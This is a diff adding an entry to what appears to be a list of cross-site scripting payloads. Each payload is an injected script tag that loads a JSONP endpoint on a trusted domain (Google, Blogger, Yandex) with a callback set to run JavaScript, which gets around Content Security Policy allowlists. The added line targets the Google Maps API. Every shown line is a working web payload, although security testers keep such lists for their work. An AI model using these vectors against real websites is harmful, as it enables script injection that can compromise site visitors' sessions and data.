@@ -4,6 +4,7 @@
 "><script src="https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)"></script>
 "><script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>
 "><script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
+"><script src="https://maps.googleapis.com/maps/api/js?key=[REPLACE_BY_GOOGLE_API_KEY_FROM_CURRENT_WEBSITE]&callback=alert(1337)"></script>
 #Blogger.com:
 "><script src="https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)"></script>
 #Yandex:
